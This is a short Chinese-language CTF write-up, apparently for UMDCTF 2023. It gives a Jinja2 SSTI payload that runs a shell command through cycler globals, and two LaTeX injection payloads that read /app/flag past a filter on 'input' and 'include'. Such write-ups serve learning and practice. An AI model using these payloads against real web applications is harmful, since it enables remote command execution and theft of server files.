
# web
### Terps Ticketing System
签到题,只需要num=0,
### pop calc
经典计算器,猜测python eval字符逃逸

---
并不是...,而是在报错处 #SSTI ...
```python
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

### notsogeo
一道谷歌地图有关的


### Homework Render
一个简单的输入框,然后渲染为pdf文件

---
没想到考点是 #Latex 插入文件... 想到hackergame了
过滤了 `input` `include`
wp
```latex
% 定义文档类
\documentclass{article}
% 加载 verbatim 包
\RequirePackage{verbatim}
% 文档开始
\begin{document}
% 定义两个token寄存器 in 和 put
\newtoks\in
\newtoks\put
% 分别设置为 "in" "put"
\in={in}
\put={put}
% 在verbatim 环境输出文本
\begin{verbatim\the\in\the\put}{/app/flag}\end{verbatim\the\in\the\put}
\end{document}
```

```latex
\begin{document} 
\^^69nput{/app/flag} 
\end{document}
```
latex 遇到 ^^时,会将两个字符后面解释为16进制的ascii

### i heart wasm

>WebAssembly（缩写为Wasm）是一种新型的低级字节码格式，可用于在现代 Web 浏览器中运行高性能计算密集型应用程序。Wasm 旨在成为一种高效、可移植和安全的二进制格式，用于将应用程序从 Web 服务器传输到客户端，并在浏览器中进行本地编译和执行。
>Wasm 可以通过将高级编程语言（如 C、C++、Rust）编译为二进制格式来生成。由于 Wasm 是一个虚拟机（VM）环境，它提供了一个安全的沙盒环境，使得在 Web 上运行的程序无法访问底层系统资源，从而更加安全可靠。Wasm 还可以与 JavaScript 和 Web API 集成，使 Web 应用程序更加功能强大和高效。

不是我等凡人能碰的

# reverse

# pwn

# crypto

# Misc


---
*相关wp*
https://github.com/UMD-CSEC/UMDCTF-Public-Challenges





2023-04-30 17:58